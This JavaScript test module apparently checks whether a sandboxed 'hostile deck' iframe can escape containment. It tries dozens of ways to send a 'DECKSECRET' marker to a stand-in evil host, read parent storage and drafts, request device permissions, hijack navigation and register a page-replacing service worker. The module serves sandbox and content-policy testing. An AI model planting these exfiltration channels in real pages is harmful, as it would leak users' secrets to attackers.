// Hostile-deck probes, evaluated inside the deck frame. module.exports = { battery, caps, navs, files }
const battery = async (cfg) => {
  const E = cfg.evil, out = {}, viol = []; const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  addEventListener('securitypolicyviolation', (e) => viol.push(e.effectiveDirective + ' <- ' + String(e.blockedURI).slice(0, 45)));
  const u = (c, ext = '') => `${E}/x${ext}?c=${c}&run=${cfg.run}&leak=DECKSECRET`;
  const t = async (name, fn) => { try { out[name] = String(await Promise.race([fn(), wait(2000).then(() => '(no event in 2 s)')])).slice(0, 110); } catch (e) { out[name] = 'ERR ' + (e && e.name) + ': ' + String(e && e.message).slice(0, 70); } };
  const mk = (tag, attrs) => Object.assign(document.createElement(tag), attrs);
  const ev = (el, where = document.body) => new Promise((r) => { el.onload = () => r('load'); el.onerror = () => r('error'); where.append(el); });
  const ins = async (el, where = document.body) => { where.append(el); await wait(350); return 'inserted'; };
  await t('fetch', () => fetch(u('fetch')).then((r) => 'status ' + r.status));
  await t('fetch-nocors', () => fetch(u('fetch-nocors'), { mode: 'no-cors' }).then((r) => r.type));
  await t('fetch-keepalive-post', () => fetch(u('fetch-keepalive-post'), { method: 'POST', body: 'leak', keepalive: true, mode: 'no-cors' }).then((r) => r.type));
  await t('xhr', () => new Promise((res) => { const x = new XMLHttpRequest(); x.open('GET', u('xhr')); x.onload = () => res('status ' + x.status); x.onerror = () => res('onerror'); x.send(); }));
  await t('beacon', async () => 'returned ' + navigator.sendBeacon(u('beacon'), 'd'));
  await t('fetchLater', async () => { if (!self.fetchLater) return 'n/a'; fetchLater(u('fetchLater'), { activateAfter: 0 }); return 'queued'; });
  await t('websocket', () => new Promise((res) => { const w = new WebSocket(E.replace(/^http/, 'ws') + '/ws?c=websocket&run=' + cfg.run); w.onopen = () => res('open'); w.onerror = () => res('onerror'); }));
  await t('eventsource', () => new Promise((res) => { const s = new EventSource(u('eventsource')); s.onopen = () => res('open'); s.onerror = () => { res('onerror'); s.close(); }; }));
  await t('webtransport', async () => { if (!self.WebTransport) return 'n/a'; const w = new WebTransport(cfg.wt + '/wt?c=webtransport'); return w.ready.then(() => 'ready', (e) => 'rejected: ' + String(e.message).slice(0, 60)); });
  await t('img', () => ev(mk('img', { src: u('img', '.png') })));
  await t('img-detached', () => new Promise((r) => { const i = new Image(); i.onload = () => r('load'); i.onerror = () => r('error'); i.src = u('img-detached', '.png'); }));
  await t('img-srcset', () => ev(mk('img', { srcset: u('img-srcset', '.png') + ' 1x' })));
  await t('script', () => ev(mk('script', { src: u('script', '.js') })));
  await t('import()', () => import(u('import', '.js')).then(() => 'imported'));
  await t('css-link', () => ev(mk('link', { rel: 'stylesheet', href: u('css-link', '.css') }), document.head));
  await t('css-import', () => ins(mk('style', { textContent: `@import url("${u('css-import', '.css')}");` }), document.head));
  await t('css-background', () => ins(mk('div', { style: `width:10px;height:10px;background:url("${u('css-background', '.png')}")` })));
  await t('font-face', () => new FontFace('leak', `url("${u('font-face', '.woff2')}")`).load().then(() => 'loaded'));
  await t('audio', () => new Promise((r) => { const a = new Audio(); a.onerror = () => r('error'); a.onloadstart = () => setTimeout(() => r('loadstart'), 400); a.src = u('audio', '.mp3'); a.load(); }));
  await t('video-poster', () => ins(mk('video', { poster: u('video-poster', '.png') })));
  await t('object', () => ins(mk('object', { data: u('object', '.html') })));
  await t('embed', () => ins(mk('embed', { src: u('embed', '.html') })));
  await t('svg-image', () => { const d = document.createElement('div'); d.innerHTML = `<svg width="10" height="10"><image href="${u('svg-image', '.png').replace(/&/g, '&amp;')}" width="10" height="10"/></svg>`; return ins(d); });
  await t('iframe-http', () => ev(mk('iframe', { src: u('iframe-http', '.html') })));
  const sub = (name, makeSrc) => t(name, () => new Promise((res) => { const ch = name + Math.random(); addEventListener('message', function on(e) { if (e.data && e.data.ch === ch) { removeEventListener('message', on); res(e.data.r); } }); const html = `<script>fetch(${JSON.stringify(u(name))}).then(r=>'status '+r.status,e=>'ERR '+e.message).then(r=>parent.postMessage({ch:${JSON.stringify(ch)},r},'*'))<\/script>`; document.body.append(mk('iframe', makeSrc(html))); }));
  await sub('iframe-srcdoc-fetch', (html) => ({ srcdoc: html }));
  await sub('iframe-blob-fetch', (html) => ({ src: URL.createObjectURL(new Blob([html], { type: 'text/html' })) }));
  await sub('iframe-data-fetch', (html) => ({ src: 'data:text/html,' + encodeURIComponent(html) }));
  await t('iframe-blank-realm-fetch', async () => { const f = mk('iframe', {}); document.body.append(f); return f.contentWindow.fetch(u('iframe-blank-realm-fetch')).then((r) => 'status ' + r.status); });
  for (const rel of ['prerender', 'prefetch', 'preload', 'modulepreload', 'manifest', 'icon', 'preconnect', 'dns-prefetch']) await t('link-' + rel, () => { const l = mk('link', { rel, href: rel === 'preconnect' || rel === 'dns-prefetch' ? cfg.tcp : u('link-' + rel, rel === 'modulepreload' ? '.js' : rel === 'icon' ? '.png' : '.html') }); if (rel === 'preload') l.setAttribute('as', 'fetch'); return ins(l, document.head); });
  await t('speculationrules', () => ins(mk('script', { type: 'speculationrules', textContent: JSON.stringify({ prefetch: [{ source: 'list', urls: [u('specrules-prefetch', '.html')] }], prerender: [{ source: 'list', urls: [u('specrules-prerender', '.html')] }] }) }), document.head));
  await t('a-ping', async () => { const a = mk('a', { href: '#p', ping: u('a-ping') }); document.body.append(a); a.click(); await wait(300); return 'clicked'; });
  await t('worker-file', () => new Promise((res) => { const w = new Worker('w.js?evil=' + encodeURIComponent(E) + '&run=' + cfg.run); w.onmessage = (e) => res(e.data); w.onerror = (e) => res('worker error ' + (e.message || '')); }));
  await t('worker-blob', () => new Promise((res) => { const w = new Worker(URL.createObjectURL(new Blob([`fetch(${JSON.stringify(u('worker-blob'))}).then(r=>'status '+r.status,e=>'ERR '+e.message).then(r=>postMessage(r))`], { type: 'text/javascript' }))); w.onmessage = (e) => res(e.data); w.onerror = () => res('worker error'); }));
  await t('sharedworker-file', () => new Promise((res) => { const w = new SharedWorker('shared.js?evil=' + encodeURIComponent(E) + '&run=' + cfg.run); w.port.onmessage = (e) => res(e.data); w.onerror = () => res('error event'); w.port.start(); }));
  await t('sw-register-deck-file', () => navigator.serviceWorker.register('evil-sw.js').then((r) => 'REGISTERED scope ' + r.scope, (e) => 'rejected ' + e.name + ': ' + String(e.message).slice(0, 90)));
  await t('sw-register-blob', () => navigator.serviceWorker.register(URL.createObjectURL(new Blob(['1'], { type: 'text/javascript' }))).then((r) => 'REGISTERED', (e) => 'rejected ' + e.name + ': ' + String(e.message).slice(0, 60)));
  await t('nosniff-script(text/plain)', async () => { const r = await ev(mk('script', { src: 'plain.txt' })); return r + ' ran=' + !!self.__plainRan; });
  await t('webrtc-stun', async () => { const pc = new RTCPeerConnection({ iceServers: [{ urls: cfg.stun }] }); pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer()); await wait(1500); const n = (pc.localDescription.sdp.match(/a=candidate/g) || []).length; pc.close(); return 'candidates in sdp: ' + n; });
  out.__violations = [...new Set(viol)]; return out;
};
const caps = async (group) => {
  const out = {}; const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const t = async (name, fn) => { try { out[name] = String(await Promise.race([fn(), wait(1500).then(() => '(pending after 1.5 s)')])).slice(0, 120); } catch (e) { out[name] = 'ERR ' + (e && e.name) + ': ' + String(e && e.message).slice(0, 80); } };
  if (group === 'reach') {
    await t('parent.document', () => parent.document.title); await t('top.location.href', () => top.location.href); await t('parent.localStorage', () => parent.localStorage.getItem('app-secret'));
    await t('parent.draft', () => parent.document.getElementById('draft').value); await t('frameElement', () => String(window.frameElement));
    await t('own localStorage[app-secret]', () => String(localStorage.getItem('app-secret'))); await t('indexedDB.databases', async () => JSON.stringify((await indexedDB.databases()).map((d) => d.name)));
    await t('parent.frames.length', () => parent.frames.length); await t('parent.postMessage', () => { parent.postMessage({ forged: 'hello from deck' }, '*'); return 'sent'; });
    await t('document.domain=', () => { document.domain = document.domain; return 'set to ' + document.domain; }); await t('origin', () => self.origin + ' secure=' + isSecureContext + ' crossOriginIsolated=' + crossOriginIsolated);
    await t('featurePolicy', () => ['fullscreen', 'geolocation', 'camera', 'microphone', 'clipboard-write', 'clipboard-read', 'display-capture', 'payment', 'usb'].map((f) => f + '=' + document.featurePolicy.allowsFeature(f)).join(' '));
    await t('alert', () => { const s = performance.now(); alert('deck alert'); return 'returned after ' + Math.round(performance.now() - s) + ' ms'; });
    await t('confirm', () => 'returned ' + confirm('deck confirm'));
    await t('geolocation', () => new Promise((res) => navigator.geolocation.getCurrentPosition(() => res('position'), (e) => res('error ' + e.code + ' ' + e.message))));
    await t('getUserMedia', () => navigator.mediaDevices.getUserMedia({ audio: true }).then(() => 'stream'));
    await t('Notification.requestPermission', () => Notification.requestPermission());
    await t('storage.persist', () => navigator.storage.persist()); await t('usb.requestDevice', () => navigator.usb ? navigator.usb.requestDevice({ filters: [] }).then(() => 'device') : 'n/a');
    await t('history.pushState x3', () => { for (let i = 0; i < 3; i++) history.pushState(null, '', '#h' + i); return 'history.length=' + history.length; });
  }
  if (group === 'fullscreen') await t('requestFullscreen', () => document.documentElement.requestFullscreen().then(() => { const r = 'entered ' + !!document.fullscreenElement; return document.exitFullscreen().then(() => r); }));
  if (group === 'pointerlock') await t('requestPointerLock', async () => { const p = document.body.requestPointerLock(); if (p && p.then) await p; await wait(200); const r = 'locked=' + (document.pointerLockElement === document.body); document.exitPointerLock(); return r; });
  if (group === 'clipboard') { await t('clipboard.writeText', () => navigator.clipboard.writeText('DECK-CLIP-API').then(() => 'written')); await t('clipboard.readText', () => navigator.clipboard.readText().then((x) => 'read ' + x)); }
  if (group === 'execcopy') await t('execCommand(copy)', () => { const ta = document.createElement('textarea'); ta.value = 'DECK-EXEC-COPY'; document.body.append(ta); ta.select(); const ok = document.execCommand('copy'); ta.remove(); return 'returned ' + ok; });
  if (group === 'filepicker') await t('showOpenFilePicker', () => self.showOpenFilePicker ? showOpenFilePicker().then(() => 'picked') : 'n/a');
  return out;
};
const navs = {
  'self-location': (U) => { location.href = U; return 'assigned'; },
  'meta-refresh': (U) => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + U; document.head.append(m); return 'inserted'; },
  'form-get': (U) => { const f = document.createElement('form'); const x = new URL(U); f.action = x.origin + x.pathname; f.method = 'GET'; for (const [k, v] of x.searchParams) { const i = document.createElement('input'); i.name = k; i.value = v; f.append(i); } document.body.append(f); f.submit(); return 'submitted'; },
  'top-location': (U) => { try { top.location = U; return 'assigned'; } catch (e) { return 'ERR ' + e.name + ': ' + e.message.slice(0, 90); } },
  'a-target-top': (U) => { const a = document.createElement('a'); a.href = U; a.target = '_top'; document.body.append(a); a.click(); return 'clicked'; },
  'window-open': (U) => { const w = window.open(U); return w ? 'window returned' : 'null'; },
  'a-target-blank': (U) => { const a = document.createElement('a'); a.href = U; a.target = '_blank'; a.rel = 'noopener'; document.body.append(a); a.click(); return 'clicked'; },
  'download': () => { const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob(['deck download'], { type: 'text/plain' })); a.download = 'from-deck.txt'; document.body.append(a); a.click(); return 'clicked'; },
};
const files = {
  'index.html': '<!doctype html><html><head><meta charset="utf-8"><title>hostile deck</title></head><body style="margin:0;height:100vh"><h1>hostile deck</h1></body></html>',
  'sub.html': '<!doctype html><title>sub</title>sub page',
  'w.js': "const q = new URL(self.location).searchParams, E = q.get('evil'), run = q.get('run'); (async () => { const r = []; r.push(await fetch(E + '/x?c=worker-file-fetch&run=' + run).then((x) => 'fetch status ' + x.status, (e) => 'fetch ERR ' + e.message)); try { importScripts(E + '/x.js?c=worker-file-importScripts&run=' + run); r.push('importScripts ok'); } catch (e) { r.push('importScripts ERR ' + e.name); } postMessage(r.join('; ')); })();",
  'shared.js': "const q = new URL(self.location).searchParams, E = q.get('evil'), run = q.get('run'); onconnect = (e) => { fetch(E + '/x?c=sharedworker-file-fetch&run=' + run).then((x) => 'fetch status ' + x.status, (er) => 'fetch ERR ' + er.message).then((r) => e.ports[0].postMessage(r)); };",
  'evil-sw.js': "self.addEventListener('fetch', (e) => e.respondWith(new Response('pwned by deck worker', { headers: { 'content-type': 'text/html' } })));",
  'plain.txt': 'self.__plainRan = true;',
};
module.exports = { battery, caps, navs, files };
